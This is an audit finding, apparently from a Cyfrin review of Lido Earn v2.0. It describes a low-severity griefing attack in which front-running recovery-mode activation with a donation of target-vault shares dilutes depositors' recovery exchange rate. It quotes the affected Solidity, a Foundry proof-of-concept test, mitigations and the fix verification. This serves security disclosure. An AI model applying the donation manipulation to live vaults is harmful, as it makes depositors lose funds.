---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-12-19-cyfrin-lido-earn-v2-0-0-2
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2025-12-19T00:00:00Z'
related_swc: []
severity: Low
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-12-19-cyfrin-lido-earn-v2.0.md
tags:
- firm:cyfrin
- report:2025-12-19-cyfrin-lido-earn-v2-0
title: Griefing attack on depositors by manipulating the exchange rate during `recoveryMode`
  via a donation of `TARGET_VAULT`s shares in between `emergencyMode` and `recoveryMode`
vuln_class: []
---

# Griefing attack on depositors by manipulating the exchange rate during `recoveryMode` via a donation of `TARGET_VAULT`s shares in between `emergencyMode` and `recoveryMode`

_Section severity (from Solodit section header): Low_  
_Audit firm: Cyfrin_  
_Source report: [2025-12-19-cyfrin-lido-earn-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-12-19-cyfrin-lido-earn-v2.0.md)_

---

**Description:** During the activation of the recovery mode is executed a call to harvest fees, which, in the scenario that it detects any profit since the last update to `lastTotalAssets` would mint more shares.
But, given the design of the system, where once the `recoveryMode` is enabled:
- It is no longer possible to withdraw from the TARGET_VAULT
- Harvesting fees consider the LidoVault's holdings on the TARGET_VAULT as part of the totalAssets, despite any leftover TARGET_VAULT's shares being no redeemable from that point onwards.

The exchange rate for the vault once the recoveryMode kicks in is based on the actual balance of underlyingToken on the LidoVault and the totalSupply at the moment of the recovery mode activation.

That setup allows for a griefing attack where the execution to activate the recovery mode is front-run, and TARGET_VAULT's shares are donated into the LidoVault. This donation will effectively increase the totalAssets, tricking the system into thinking that there are profits to charge fees on, as such, minting new shares, which effectively dilutes the exchange rate compared to the actual underlyingTokens on the LidoVault's balance.
```solidity
    function activateRecovery() external virtual onlyRole(EMERGENCY_ROLE) nonReentrant {
        if (recoveryMode) revert RecoveryModeAlreadyActive();
        if (!emergencyMode) revert EmergencyModeNotActive();

        //@audit => The donation of TARGET_VAULT shares causes more shares to be minted
        _harvestFees();

        uint256 actualBalance = IERC20(asset()).balanceOf(address(this));
        if (actualBalance == 0) revert InvalidRecoveryAssets(actualBalance);

        uint256 supply = totalSupply();
       ...

        recoveryAssets = actualBalance;
        recoverySupply = supply;
        recoveryMode = true;

        emit RecoveryModeActivated(actualBalance, supply, protocolBalance, implicitLoss);
    }

    function convertToAssets(uint256 shares) public view virtual override returns (uint256) {
        //@audit => exchange rate during recovery mode no longer considers the TARGET_VAULT's shares worth in underlying token.
        if (recoveryMode) {
            return shares.mulDiv(recoveryAssets, recoverySupply, Math.Rounding.Floor);
        }
        return super.convertToAssets(shares);
    }
```

**Impact:** The recovery exchange rate can be manipulated, effectively causing depositors to recover fewer tokens than they could've otherwise gotten.

Given that this grief attack requires the "attacker" to incur a loss, the probability is low; nevertheless, the impact is considerable, given that depositors would incur a loss of assets.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Vault} from "src/Vault.sol";
import "./ERC4626AdapterTestBase.sol";

contract ERC4626AdapterPoCs is ERC4626AdapterTestBase {

    function test_PoC_manipulateShareRatioOnRecoveryMode() public {
        //@audit-info => The mitigation would be to swap `_harvestFees()` to `emergencyWithdraw()` and add a function to allow Governance withdrawing from vault once recoveryMode is enabled!
        uint256 depositAmount = 100e6;
        vault.setRewardFee(2000);

        vm.prank(alice);
        vault.deposit(depositAmount, alice);

        vault.emergencyWithdraw();
        assertEq(vault.totalAssets(),depositAmount);

        uint256 aliceAssetsDuringEmergency = vault.convertToAssets(vault.balanceOf(alice));
        assertEq(aliceAssetsDuringEmergency, depositAmount);

        uint256 snapshot = vm.snapshot();
        {
            //@audit-info => A donation to the LidoVault of TARGET_VAULT's shares
            vm.startPrank(bob);
            usdc.approve(address(targetVault), depositAmount);
            targetVault.deposit(depositAmount, address(vault));
            vm.stopPrank();

            vault.activateRecovery();
            assertEq(depositAmount, vault.recoveryAssets());

            //@audit => Manipulation -> depositor gets less assets that could've otherwise got
            uint256 aliceAssetsOnRecoveryMode = vault.convertToAssets(vault.balanceOf(alice));
            assertTrue(aliceAssetsDuringEmergency > aliceAssetsOnRecoveryMode);

            emit log_named_uint("aliceAssetsDuringEmergency: ", aliceAssetsDuringEmergency);
            emit log_named_uint("aliceAssetsOnRecoveryMode: ", aliceAssetsOnRecoveryMode);
        }

        vm.revertTo(snapshot);

        vault.activateRecovery();

        //@audit => No manipulation -> depositor gets the correct exchange rate during recoveryMode
        uint256 aliceAssetsOnRecoveryMode = vault.convertToAssets(vault.balanceOf(alice));
        assertEq(aliceAssetsOnRecoveryMode, aliceAssetsDuringEmergency);
    }
}
```

**Recommended Mitigation:**
1. Consider harvesting the fees during the emergency withdrawal process, rather than during the activation of recovery mode.
2. Consider allowing the `ERC4626Adapter::recoverERC20` function to sweep TARGET_VAULT's leftover tokens once the `recoveryMode` is enabled.

This is a more defensive strategy to protect users' funds by prioritizing the preservation of the expected exchange rate based on the actual underlyingTokens on the LidoVault and deferring the potential gains in fees as a secondary action by sweeping any leftover TARGET_VAULT's shares.

**Lido**
Fixed in commit [4fd0eb7](https://github.com/lidofinance/defi-interface/commit/4fd0eb7207f607179bf470c77877baafd79dfd53) and [ee29862](https://github.com/lidofinance/defi-interface/commit/ee298626d62e4d18f44b10a5cd6cbcbd3cae7188)

**Cyfrin:** Verified. `_harvestFees` is now called during the activation of the `emergencyMode`. Any leftover `TARGET_VAULT` shares can now be recovered by governance when `recoveryMode` has been enabled via the `recoverERC20`.
